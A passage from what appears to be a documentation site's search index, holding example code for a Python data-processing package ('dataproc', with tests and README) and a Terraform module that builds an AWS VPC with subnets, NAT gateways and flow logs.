str:\n    \"\"\"Clean text by removing extra whitespace and special characters.\n\n    Args:\n        text: Text to clean\n\n    Returns:\n        Cleaned text\n    \"\"\"\n    # Remove extra whitespace\n    text = \" \".join(text.split())\n\n    # Remove special characters except basic punctuation\n    text = re.sub(r\"[^\\w\\s.,!?-]\", \"\", text)\n\n    return text.strip()\n\ndef normalize_numeric(value: float, min_val: float = 0.0, max_val: float = 1.0) -&gt; float:\n    \"\"\"Normalize numeric value to specified range.\n\n    Args:\n        value: Value to normalize\n        min_val: Minimum value of range\n        max_val: Maximum value of range\n\n    Returns:\n        Normalized value\n    \"\"\"\n    if min_val &gt;= max_val:\n        raise ValueError(\"min_val must be less than max_val\")\n\n    normalized = (value - min_val) / (max_val - min_val)\n    return max(0.0, min(1.0, normalized))\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataprocexporterspy","title":"src/dataproc/exporters.py","text":"<pre><code>\"\"\"Data export utilities.\"\"\"\n\nimport json\nfrom abc import ABC, abstractmethod\nfrom pathlib import Path\n\nimport pandas as pd\n\nclass Exporter(ABC):\n    \"\"\"Base exporter class.\"\"\"\n\n    @abstractmethod\n    def export(self, data: pd.DataFrame, output_path: Path) -&gt; None:\n        \"\"\"Export data to file.\n\n        Args:\n            data: DataFrame to export\n            output_path: Path to output file\n        \"\"\"\n        pass\n\nclass CSVExporter(Exporter):\n    \"\"\"Export data to CSV format.\"\"\"\n\n    def __init__(self, delimiter: str = \",\") -&gt; None:\n        \"\"\"Initialize CSVExporter.\n\n        Args:\n            delimiter: CSV delimiter character\n        \"\"\"\n        self.delimiter = delimiter\n\n    def export(self, data: pd.DataFrame, output_path: Path) -&gt; None:\n        \"\"\"Export data to CSV file.\n\n        Args:\n            data: DataFrame to export\n            output_path: Path to output CSV file\n        \"\"\"\n        data.to_csv(output_path, sep=self.delimiter, index=False)\n\nclass JSONExporter(Exporter):\n    \"\"\"Export data to JSON format.\"\"\"\n\n    def __init__(self, indent: int = 2) -&gt; None:\n        \"\"\"Initialize JSONExporter.\n\n        Args:\n            indent: JSON indentation spaces\n        \"\"\"\n        self.indent = indent\n\n    def export(self, data: pd.DataFrame, output_path: Path) -&gt; None:\n        \"\"\"Export data to JSON file.\n\n        Args:\n            data: DataFrame to export\n            output_path: Path to output JSON file\n        \"\"\"\n        data.to_json(output_path, orient=\"records\", indent=self.indent)\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#testsconftestpy","title":"tests/conftest.py","text":"<pre><code>\"\"\"Pytest configuration and fixtures.\"\"\"\n\nfrom pathlib import Path\n\nimport pandas as pd\nimport pytest\n\n@pytest.fixture\ndef sample_csv(tmp_path: Path) -&gt; Path:\n    \"\"\"Create sample CSV file.\n\n    Args:\n        tmp_path: Pytest temporary directory\n\n    Returns:\n        Path to sample CSV file\n    \"\"\"\n    csv_path = tmp_path / \"sample.csv\"\n    data = pd.DataFrame({\n        \"name\": [\"Alice\", \"Bob\", \"Charlie\"],\n        \"age\": [25, 30, 35],\n        \"email\": [\"alice@example.com\", \"bob@example.com\", \"charlie@example.com\"],\n    })\n    data.to_csv(csv_path, index=False)\n    return csv_path\n\n@pytest.fixture\ndef sample_dataframe() -&gt; pd.DataFrame:\n    \"\"\"Create sample DataFrame.\n\n    Returns:\n        Sample DataFrame\n    \"\"\"\n    return pd.DataFrame({\n        \"name\": [\"Alice\", \"Bob\", \"Charlie\"],\n        \"age\": [25, 30, 35],\n        \"score\": [85.5, 92.0, 78.5],\n    })\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#teststest_corepy","title":"tests/test_core.py","text":"<pre><code>\"\"\"Tests for core functionality.\"\"\"\n\nfrom pathlib import Path\n\nimport pandas as pd\nimport pytest\n\nfrom dataproc.core import DataProcessor, ValidationResult\n\nclass TestDataProcessor:\n    \"\"\"Tests for DataProcessor class.\"\"\"\n\n    def test_load_csv_success(self, sample_csv: Path) -&gt; None:\n        \"\"\"Test successful CSV loading.\"\"\"\n        processor = DataProcessor()\n        data = processor.load_csv(sample_csv)\n\n        assert isinstance(data, pd.DataFrame)\n        assert len(data) == 3\n        assert \"name\" in data.columns\n\n    def test_load_csv_file_not_found(self) -&gt; None:\n        \"\"\"Test CSV loading with nonexistent file.\"\"\"\n        processor = DataProcessor()\n\n        with pytest.raises(FileNotFoundError):\n            processor.load_csv(Path(\"nonexistent.csv\"))\n\n    def test_validate_empty_data(self) -&gt; None:\n        \"\"\"Test validation of empty DataFrame.\"\"\"\n        processor = DataProcessor()\n        empty_df = pd.DataFrame()\n\n        result = processor.validate(empty_df)\n\n        assert not result.is_valid\n        assert \"empty\" in result.errors[0].lower()\n\n    def test_validate_with_missing_values(self, sample_dataframe: pd.DataFrame) -&gt; None:\n        \"\"\"Test validation with missing values.\"\"\"\n        processor = DataProcessor()\n        df_with_na = sample_dataframe.copy()\n        df_with_na.loc[0, \"age\"] = None\n\n        result = processor.validate(df_with_na)\n\n        assert result.is_valid  # Warnings don't fail validation\n        assert len(result.warnings) &gt; 0\n        assert \"missing\" in result.warnings[0].lower()\n\n    def test_transform_drop_duplicates(self, sample_dataframe: pd.DataFrame) -&gt; None:\n        \"\"\"Test drop duplicates transformation.\"\"\"\n        processor = DataProcessor()\n        df_with_dupes = pd.concat([sample_dataframe, sample_dataframe.iloc[[0]]])\n\n        result = processor.transform(df_with_dupes, [\"drop_duplicates\"])\n\n        assert len(result) == len(sample_dataframe)\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#teststest_validatorspy","title":"tests/test_validators.py","text":"<pre><code>\"\"\"Tests for validators.\"\"\"\n\nimport pytest\n\nfrom dataproc.validators import EmailValidator, RangeValidator\n\nclass TestEmailValidator:\n    \"\"\"Tests for EmailValidator.\"\"\"\n\n    def test_valid_email(self) -&gt; None:\n        \"\"\"Test validation of valid email.\"\"\"\n        validator = EmailValidator()\n\n        assert validator.validate(\"user@example.com\")\n        assert validator.validate(\"test.user@company.co.uk\")\n\n    def test_invalid_email(self) -&gt; None:\n        \"\"\"Test validation of invalid email.\"\"\"\n        validator = EmailValidator()\n\n        assert not validator.validate(\"invalid\")\n        assert not validator.validate(\"@example.com\")\n        assert not validator.validate(\"user@\")\n        assert not validator.validate(123)\n\nclass TestRangeValidator:\n    \"\"\"Tests for RangeValidator.\"\"\"\n\n    def test_value_in_range(self) -&gt; None:\n        \"\"\"Test validation of value within range.\"\"\"\n        validator = RangeValidator(0.0, 100.0)\n\n        assert validator.validate(50.0)\n        assert validator.validate(0.0)\n        assert validator.validate(100.0)\n\n    def test_value_out_of_range(self) -&gt; None:\n        \"\"\"Test validation of value outside range.\"\"\"\n        validator = RangeValidator(0.0, 100.0)\n\n        assert not validator.validate(-1.0)\n        assert not validator.validate(101.0)\n\n    def test_invalid_value_type(self) -&gt; None:\n        \"\"\"Test validation of invalid value type.\"\"\"\n        validator = RangeValidator(0.0, 100.0)\n\n        assert not validator.validate(\"not a number\")\n        assert not validator.validate(None)\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#teststest_transformerspy","title":"tests/test_transformers.py","text":"<pre><code>\"\"\"Tests for transformers.\"\"\"\n\nimport pytest\n\nfrom dataproc.transformers import clean_text, normalize_numeric\n\ndef test_clean_text() -&gt; None:\n    \"\"\"Test text cleaning.\"\"\"\n    assert clean_text(\"  Hello   World  \") == \"Hello World\"\n    assert clean_text(\"Test@#$%Text\") == \"TestText\"\n    assert clean_text(\"Keep, this! and? that-\") == \"Keep, this! and? that-\"\n\ndef test_normalize_numeric() -&gt; None:\n    \"\"\"Test numeric normalization.\"\"\"\n    assert normalize_numeric(50.0, 0.0, 100.0) == 0.5\n    assert normalize_numeric(0.0, 0.0, 100.0) == 0.0\n    assert normalize_numeric(100.0, 0.0, 100.0) == 1.0\n\ndef test_normalize_numeric_invalid_range() -&gt; None:\n    \"\"\"Test normalization with invalid range.\"\"\"\n    with pytest.raises(ValueError):\n        normalize_numeric(50.0, 100.0, 0.0)\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#teststest_exporterspy","title":"tests/test_exporters.py","text":"<pre><code>\"\"\"Tests for exporters.\"\"\"\n\nimport json\nfrom pathlib import Path\n\nimport pandas as pd\nimport pytest\n\nfrom dataproc.exporters import CSVExporter, JSONExporter\n\ndef test_csv_exporter(sample_dataframe: pd.DataFrame, tmp_path: Path) -&gt; None:\n    \"\"\"Test CSV export.\"\"\"\n    exporter = CSVExporter()\n    output_path = tmp_path / \"output.csv\"\n\n    exporter.export(sample_dataframe, output_path)\n\n    assert output_path.exists()\n    loaded = pd.read_csv(output_path)\n    assert len(loaded) == len(sample_dataframe)\n\ndef test_json_exporter(sample_dataframe: pd.DataFrame, tmp_path: Path) -&gt; None:\n    \"\"\"Test JSON export.\"\"\"\n    exporter = JSONExporter()\n    output_path = tmp_path / \"output.json\"\n\n    exporter.export(sample_dataframe, output_path)\n\n    assert output_path.exists()\n    with output_path.open() as f:\n        data = json.load(f)\n    assert len(data) == len(sample_dataframe)\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#readmemd","title":"README.md","text":"<pre><code>## DataProc\n\n[![CI](https://github.com/tydukes/dataproc/workflows/CI/badge.svg)](https://github.com/tydukes/dataproc/actions)\n[![codecov](https://codecov.io/gh/tydukes/dataproc/branch/main/graph/badge.svg)](https://codecov.io/gh/tydukes/dataproc)\n[![PyPI version](https://badge.fury.io/py/dataproc.svg)](https://badge.fury.io/py/dataproc)\n[![Python versions](https://img.shields.io/pypi/pyversions/dataproc.svg)](https://pypi.org/project/dataproc/)\n\nA modern Python library for data processing, validation, and export.\n\n## Features\n\n- \u2728 Simple and intuitive API\n- \ud83d\udd0d Built-in data validation\n- \ud83d\udcca Multiple export formats (CSV, JSON)\n- \ud83d\udee1\ufe0f Type-safe with comprehensive type hints\n- \u2705 Fully tested (&gt;95% coverage)\n- \ud83d\udce6 Zero-config CLI tool\n\n## Installation\n\n```bash\npip install dataproc\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#quick-start","title":"Quick Start","text":"<pre><code>from dataproc import DataProcessor, EmailValidator\n\n## Initialize processor\nprocessor = DataProcessor()\n\n## Load data\ndata = processor.load_csv(\"data.csv\")\n\n## Validate\nresult = processor.validate(data)\nif result.is_valid:\n    print(\"Data is valid!\")\n\n## Transform\ncleaned = processor.transform(data, [\"drop_duplicates\", \"drop_na\"])\n\n## Export\nfrom dataproc import JSONExporter\nexporter = JSONExporter()\nexporter.export(cleaned, \"output.json\")\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#cli-usage","title":"CLI Usage","text":"<pre><code>## Process CSV file\ndataproc input.csv -o output.json -f json\n\n## With verbose output\ndataproc input.csv --verbose\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#development","title":"Development","text":"<pre><code>## Clone repository\ngit clone https://github.com/tydukes/dataproc.git\ncd dataproc\n\n## Install with dev dependencies\npip install -e \".[dev]\"\n\n## Run tests\npytest\n\n## Run linters\nblack src tests\nruff check src tests\nmypy src\n```text\n\n## License\n\nMIT License - see LICENSE file for details.\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#key-takeaways","title":"Key Takeaways","text":"<p>This complete example demonstrates:</p> <ol> <li>Modern project structure with <code>src</code> layout</li> <li>Type hints throughout for better IDE support and type checking</li> <li>Comprehensive testing with pytest fixtures and parametrization</li> <li>CLI integration with argparse</li> <li>Proper abstractions using ABC for validators and exporters</li> <li>Documentation with docstrings following Google style</li> <li>Configuration with pyproject.toml for all tools</li> <li>Best practices for error handling, validation, and user feedback</li> </ol> <p>The package is fully functional and can be installed, tested, and used as a real-world example of Python packaging best practices.</p> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/terraform_module_example/","title":"Complete Terraform Module Example","text":"","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#overview","title":"Overview","text":"<p>This is a complete, production-ready Terraform module called terraform-aws-vpc that creates a VPC with public and private subnets, NAT gateways, and all necessary networking components. It demonstrates all best practices from the Terraform Module Template.</p> <p>Module Purpose: Creates a highly available AWS VPC with configurable public and private subnets across multiple availability zones.</p>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#module-structure","title":"Module Structure","text":"<pre><code>terraform-aws-vpc/\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 main.tf\n\u251c\u2500\u2500 variables.tf\n\u251c\u2500\u2500 outputs.tf\n\u251c\u2500\u2500 versions.tf\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple/\n\u2502   \u2502   \u251c\u2500\u2500 main.tf\n\u2502   \u2502   \u251c\u2500\u2500 outputs.tf\n\u2502   \u2502   \u2514\u2500\u2500 README.md\n\u2502   \u2514\u2500\u2500 complete/\n\u2502       \u251c\u2500\u2500 main.tf\n\u2502       \u251c\u2500\u2500 outputs.tf\n\u2502       \u2514\u2500\u2500 README.md\n\u251c\u2500\u2500 test/\n\u2502   \u2514\u2500\u2500 vpc_test.go\n\u2514\u2500\u2500 .gitignore\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#readmemd","title":"README.md","text":"<pre><code>## AWS VPC Terraform Module\n\nTerraform module for creating a highly available AWS VPC with public and private subnets.\n\n## Features\n\n- \u2705 VPC with configurable CIDR block\n- \u2705 Public and private subnets across multiple AZs\n- \u2705 NAT Gateways for private subnet internet access\n- \u2705 Internet Gateway for public subnets\n- \u2705 Route tables with proper routing\n- \u2705 VPC Flow Logs (optional)\n- \u2705 DNS support enabled\n- \u2705 Configurable tags\n\n## Usage\n\n### Simple Example\n\n\\```hcl\nmodule \"vpc\" {\n  source = \"github.com/myorg/terraform-aws-vpc\"\n\n  name               = \"my-vpc\"\n  cidr_block         = \"10.0.0.0/16\"\n  availability_zones = [\"us-east-1a\", \"us-east-1b\"]\n\n  tags = {\n    Environment = \"production\"\n  }\n}\n\\```\n\n### Complete Example\n\n\\```hcl\nmodule \"vpc\" {\n  source = \"github.com/myorg/terraform-aws-vpc\"\n\n  name               = \"production-vpc\"\n  cidr_block         = \"10.0.0.0/16\"\n  availability_zones = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n\n  # Public subnets\n  public_subnet_cidrs = [\"10.0.1.0/24\", \"10.0.2.0/24\", \"10.0.3.0/24\"]\n\n  # Private subnets\n  private_subnet_cidrs = [\"10.0.11.0/24\", \"10.0.12.0/24\", \"10.0.13.0/24\"]\n\n  # NAT Gateway configuration\n  enable_nat_gateway     = true\n  single_nat_gateway     = false\n  one_nat_gateway_per_az = true\n\n  # VPC Flow Logs\n  enable_flow_logs           = true\n  flow_logs_retention_days   = 30\n\n  tags = {\n    Environment = \"production\"\n    Project     = \"my-project\"\n    ManagedBy   = \"Terraform\"\n  }\n}\n\\```\n\n## Requirements\n\n| Name | Version |\n|------|---------|\n| terraform | &gt;= 1.0 |\n| aws | &gt;= 5.0 |\n\n## Providers\n\n| Name | Version |\n|------|---------|\n| aws | &gt;= 5.0 |\n\n## Inputs\n\n| Name | Description | Type | Default | Required |\n|------|-------------|------|---------|:--------:|\n| name | Name prefix for VPC resources | `string` | n/a | yes |\n| cidr_block | CIDR block for VPC | `string` | n/a | yes |\n| availability_zones | List of availability zones | `list(string)` | n/a | yes |\n| public_subnet_cidrs | CIDR blocks for public subnets | `list(string)` | `[]` | no |\n| private_subnet_cidrs | CIDR blocks for private subnets | `list(string)` | `[]` | no |\n| enable_nat_gateway | Enable NAT Gateway for private subnets | `bool` | `true` | no |\n| single_nat_gateway | Use single NAT Gateway for all AZs | `bool` | `false` | no |\n| enable_flow_logs | Enable VPC Flow Logs | `bool` | `false` | no |\n| tags | Tags to apply to resources | `map(string)` | `{}` | no |\n\n## Outputs\n\n| Name | Description |\n|------|-------------|\n| vpc_id | The ID of the VPC |\n| vpc_cidr | The CIDR block of the VPC |\n| public_subnet_ids | List of public subnet IDs |\n| private_subnet_ids | List of private subnet IDs |\n| nat_gateway_ids | List of NAT Gateway IDs |\n\n## Examples\n\n- [Simple](./examples/simple) - Basic VPC with defaults\n- [Complete](./examples/complete) - Production VPC with all features\n\n## Testing\n\n\\```bash\ncd test\ngo test -v -timeout 30m\n\\```\n\n## License\n\nApache 2.0\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#maintf","title":"main.tf","text":"<pre><code>## VPC\nresource \"aws_vpc\" \"this\" {\n  cidr_block           = var.cidr_block\n  enable_dns_hostnames = var.enable_dns_hostnames\n  enable_dns_support   = var.enable_dns_support\n\n  tags = merge(\n    var.tags,\n    {\n      Name = var.name\n    }\n  )\n}\n\n## Internet Gateway\nresource \"aws_internet_gateway\" \"this\" {\n  count = length(var.public_subnet_cidrs) &gt; 0 ? 1 : 0\n\n  vpc_id = aws_vpc.this.id\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-igw\"\n    }\n  )\n}\n\n## Public Subnets\nresource \"aws_subnet\" \"public\" {\n  count = length(var.public_subnet_cidrs)\n\n  vpc_id                  = aws_vpc.this.id\n  cidr_block              = var.public_subnet_cidrs[count.index]\n  availability_zone       = var.availability_zones[count.index % length(var.availability_zones)]\n  map_public_ip_on_launch = true\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-public-${var.availability_zones[count.index % length(var.availability_zones)]}\"\n      Type = \"public\"\n    }\n  )\n}\n\n## Private Subnets\nresource \"aws_subnet\" \"private\" {\n  count = length(var.private_subnet_cidrs)\n\n  vpc_id            = aws_vpc.this.id\n  cidr_block        = var.private_subnet_cidrs[count.index]\n  availability_zone = var.availability_zones[count.index % length(var.availability_zones)]\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-private-${var.availability_zones[count.index % length(var.availability_zones)]}\"\n      Type = \"private\"\n    }\n  )\n}\n\n## Elastic IPs for NAT Gateways\nresource \"aws_eip\" \"nat\" {\n  count = var.enable_nat_gateway ? (var.single_nat_gateway ? 1 : (var.one_nat_gateway_per_az ? length(var.availability_zones) : length(var.private_subnet_cidrs))) : 0\n\n  domain = \"vpc\"\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-nat-eip-${count.index + 1}\"\n    }\n  )\n\n  depends_on = [aws_internet_gateway.this]\n}\n\n## NAT Gateways\nresource \"aws_nat_gateway\" \"this\" {\n  count = var.enable_nat_gateway ? (var.single_nat_gateway ? 1 : (var.one_nat_gateway_per_az ? length(var.availability_zones) : length(var.private_subnet_cidrs))) : 0\n\n  allocation_id = aws_eip.nat[count.index].id\n  subnet_id     = aws_subnet.public[count.index % length(aws_subnet.public)].id\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-nat-${count.index + 1}\"\n    }\n  )\n\n  depends_on = [aws_internet_gateway.this]\n}\n\n## Public Route Table\nresource \"aws_route_table\" \"public\" {\n  count = length(var.public_subnet_cidrs) &gt; 0 ? 1 : 0\n\n  vpc_id = aws_vpc.this.id\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-public-rt\"\n    }\n  )\n}\n\n## Public Route\nresource \"aws_route\" \"public_internet_gateway\" {\n  count = length(var.public_subnet_cidrs) &gt; 0 ? 1 : 0\n\n  route_table_id         = aws_route_table.public[0].id\n  destination_cidr_block = \"0.0.0.0/0\"\n  gateway_id             = aws_internet_gateway.this[0].id\n}\n\n## Public Subnet Route Table Associations\nresource \"aws_route_table_association\" \"public\" {\n  count = length(var.public_subnet_cidrs)\n\n  subnet_id      = aws_subnet.public[count.index].id\n  route_table_id = aws_route_table.public[0].id\n}\n\n## Private Route Tables\nresource \"aws_route_table\" \"private\" {\n  count = var.enable_nat_gateway ? (var.single_nat_gateway ? 1 : (var.one_nat_gateway_per_az ? length(var.availability_zones) : length(var.private_subnet_cidrs))) : length(var.private_subnet_cidrs) &gt; 0 ? 1 : 0\n\n  vpc_id = aws_vpc.this.id\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-private-rt-${count.index + 1}\"\n    }\n  )\n}\n\n## Private Routes to NAT Gateway\nresource \"aws_route\" \"private_nat_gateway\" {\n  count = var.enable_nat_gateway ? length(aws_route_table.private) : 0\n\n  route_table_id         = aws_route_table.private[count.index].id\n  destination_cidr_block = \"0.0.0.0/0\"\n  nat_gateway_id         = aws_nat_gateway.this[count.index].id\n}\n\n## Private Subnet Route Table Associations\nresource \"aws_route_table_association\" \"private\" {\n  count = length(var.private_subnet_cidrs)\n\n  subnet_id      = aws_subnet.private[count.index].id\n  route_table_id = aws_route_table.private[var.single_nat_gateway ? 0 : (var.one_nat_gateway_per_az ? count.index % length(var.availability_zones) : count.index)].id\n}\n\n## VPC Flow Logs\nresource \"aws_flow_log\" \"this\" {\n  count = var.enable_flow_logs ? 1 : 0\n\n  iam_role_arn    = aws_iam_role.flow_logs[0].arn\n  log_destination = aws_cloudwatch_log_group.flow_logs[0].arn\n  traffic_type    = \"ALL\"\n  vpc_id          = aws_vpc.this.id\n\n  tags = merge(\n    var.tags,\n    {\n      Name = \"${var.name}-flow-logs\"\n    }\n  )\n}\n\n## CloudWatch Log Group for Flow Logs\nresource \"aws_cloudwatch_log_group\" \"flow_logs\" {\n  count = var.enable_flow_logs ? 1 : 0\n\n  name              = \"/aws/vpc/${var.name}\"\n  retention_in_days = var.flow_logs_retention_days\n\n  tags = var.tags\n}\n\n## IAM Role for Flow Logs\nresource \"aws_iam_role\" \"flow_logs\" {\n  count = var.enable_flow_logs ? 1 : 0\n\n  name = \"${var.name}-flow-logs-role\"\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Effect = \"Allow\"\n        Principal = {\n          Service = \"vpc-flow-logs.amazonaws.com\"\n        }\n      }\n    ]\n  })\n\n  tags = var.tags\n}\n\n## IAM Policy for Flow Logs\nresource \"aws_iam_role_policy\" \"flow_logs\" {\n  count = var.enable_flow_logs ? 1 : 0\n\n  name = \"${var.name}-flow-logs-policy\"\n  role = aws_iam_role.flow_logs[0].id\n\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\n          \"logs:CreateLogGroup\",\n          \"logs:CreateLogStream\",\n          \"logs:PutLogEvents\",\n          \"logs:DescribeLogGroups\",\n          \"logs:DescribeLogStreams\"\n        ]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#variablestf","title":"variables.tf","text":"<pre><code>variable \"name\" {\n  description = \"Name prefix for VPC resources\"\n  type        = string\n\n  validation {\n    condition     = length(var.name) &gt; 0 &amp;&amp; length(var.name) &lt;= 32\n    error_message = \"Name must be between 1 and 32 characters\"\n  }\n}\n\nvariable \"cidr_block\" {\n  description = \"CIDR block for VPC\"\n  type        = string\n\n  validation {\n    condition     = can(cidrhost(var.cidr_block, 0))\n    error_message = \"Must be a valid CIDR block\"\n  }\n}\n\nvariable \"availability_zones\" {\n  description = \"List of availability zones for subnets\"\n  type        = list(string)\n\n  validation {\n    condition     = length(var.availability_zones) &gt;= 2\n    error_message = \"At least 2 availability zones required for high availability\"\n  }\n}\n\nvariable \"public_subnet_cidrs\" {\n  description = \"CIDR blocks for public subnets\"\n  type        = list(string)\n  default     = []\n}\n\nvariable \"private_subnet_cidrs\" {\n  description = \"CIDR blocks for private subnets\"\n  type        = list(string)\n  default     = []\n}\n\nvariable \"enable_dns_hostnames\" {\n  description = \"Enable DNS hostnames in VPC\"\n  type        = bool\n  default     = true\n}\n\nvariable \"enable_dns_support\" {\n  description = \"Enable DNS support in VPC\"\n  type        = bool\n  default     = true\n}\n\nvariable \"enable_nat_gateway\" {\n  description = \"Enable NAT Gateway for private subnets\"\n  type        = bool\n  default     = true\n}\n\nvariable \"single_nat_gateway\" {\n  description = \"Use a single NAT Gateway for all private subnets (cost savings but not HA)\"\n  type        = bool\n  default     = false\n}\n\nvariable \"one_nat_gateway_per_az\" {\n  description = \"Create one NAT Gateway per availability zone (recommended for HA)\"\n  type        = bool\n  default     = true\n}\n\nvariable \"enable_flow_logs\" {\n  description = \"Enable VPC Flow Logs to CloudWatch\"\n  type        = bool\n  default     = false\n}\n\nvariable \"flow_logs_retention_days\" {\n  description = \"Number of days to retain VPC Flow Logs\"\n  type        = number\n  default     = 30\n\n  validation {\n    condition     = contains([0, 1, 3, 5, 7, 14, 30, 60, 90, 120, 150, 180, 365, 400, 545, 731, 1827, 3653], var.flow_logs_retention_days)\n    error_message = \"Must be a valid CloudWatch Logs retention period\"\n  }\n}\n\nvariable \"tags\" {\n  description = \"Tags to apply to all resources\"\n  type        = map(string)\n  default     = {}\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#outputstf","title":"outputs.tf","text":"<pre><code>output \"vpc_id\" {\n  description = \"The ID of the VPC\"\n  value       = aws_vpc.this.id\n}\n\noutput \"vpc_arn\" {\n  description = \"The ARN of the VPC\"\n  value       = aws_vpc.this.arn\n}\n\noutput \"vpc_cidr\" {\n  description = \"The CIDR block of the VPC\"\n  value       = aws_vpc.this.cidr_block\n}\n\noutput \"public_subnet_ids\" {\n  description = \"List of public subnet IDs\"\n  value       = aws_subnet.public[*].id\n}\n\noutput \"public_subnet_cidrs\" {\n  description = \"List of public subnet CIDR blocks\"\n  value       = aws_subnet.public[*].cidr_block\n}\n\noutput \"private_subnet_ids\" {\n  description = \"List of private subnet IDs\"\n  value       = aws_subnet.private[*].id\n}\n\noutput \"private_subnet_cidrs\" {\n  description = \"List of private subnet CIDR blocks\"\n  value       = aws_subnet.private[*].cidr_block\n}\n\noutput \"internet_gateway_id\" {\n  description = \"The ID of the Internet Gateway\"\n  value       = length(aws_internet_gateway.this) &gt; 0 ? aws_internet_gateway.this[0].id : null\n}\n\noutput \"nat_gateway_ids\" {\n  description = \"List of NAT Gateway IDs\"\n  value       = aws_nat_gateway.this[*].id\n}\n\noutput \"nat_gateway_public_ips\" {\n  description = \"List of NAT Gateway public IPs\"\n  value       = aws_eip.nat[*].public_ip\n}\n\noutput \"public_route_table_id\" {\n  description = \"ID of the public route table\"\n  value       = length(aws_route_table.public) &gt; 0 ? aws_route_table.public[0].id : null\n}\n\noutput \"private_route_table_ids\" {\n  description = \"List of private route table IDs\"\n  value       = aws_route_table.private[*].id\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#versionstf","title":"versions.tf","text":"<pre><code>terraform {\n  required_version = \"&gt;= 1.0\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"&gt;= 5.0\"\n    }\n  }\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#examplessimplemaintf","title":"examples/simple/main.tf","text":"<pre><code>provider \"aws\" {\n  region = \"us-east-1\"\n}\n\nmodule \"vpc\" {\n  source = \"../../\"\n\n  name               = \"simple-vpc\"\n  cidr_block         = \"10.0.0.0/16\"\n  availability_zones = [\"us-east-1a\", \"us-east-1b\"]\n\n  public_subnet_cidrs  = [\"10.0.1.0/24\", \"10.0.2.0/24\"]\n  private_subnet_cidrs = [\"10.0.11.0/24\", \"10.0.12.0/24\"]\n\n  tags = {\n    Environment = \"dev\"\n    Example     = \"simple\"\n  }\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#examplessimpleoutputstf","title":"examples/simple/outputs.tf","text":"<pre><code>output \"vpc_id\" {\n  description = \"The ID of the VPC\"\n  value       = module.vpc.vpc_id\n}\n\noutput \"public_subnet_ids\" {\n  description = \"List of public subnet IDs\"\n  value       = module.vpc.public_subnet_ids\n}\n\noutput \"private_subnet_ids\" {\n  description = \"List of private subnet IDs\"\n  value       = module.vpc.private_subnet_ids\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#examplescompletemaintf","title":"examples/complete/main.tf","text":"<pre><code>provider \"aws\" {\n  region = var.aws_region\n}\n\nmodule \"vpc\" {\n  source = \"../../\"\n\n  name               = \"production-vpc\"\n  cidr_block         = \"10.0.0.0/16\"\n  availability_zones = [\"us-east-1a\", \"us-east-1b\", \"us-east-1c\"]\n\n  # Public subnets for load balancers, bastion hosts\n  public_subnet_cidrs = [\n    \"10.0.1.0/24\",\n    \"10.0.2.0/24\",\n    \"10.0.3.0/24\",\n  ]\n\n  # Private subnets for application servers\n  private_subnet_cidrs = [\n    \"10.0.11.0/24\",\n    \"10.0.12.0/24\",\n    \"10.0.13.0/24\",\n  ]\n\n  # High availability NAT Gateway configuration\n  enable_nat_gateway     = true\n  single_nat_gateway     = false\n  one_nat_gateway_per_az = true\n\n  # Enable DNS\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  # Enable VPC Flow Logs for security monitoring\n  enable_flow_logs         = true\n  flow_logs_retention_days = 90\n\n  tags = {\n    Environment = \"production\"\n    Project     = \"infrastructure\"\n    ManagedBy   = \"Terraform\"\n    CostCenter  = \"engineering\"\n  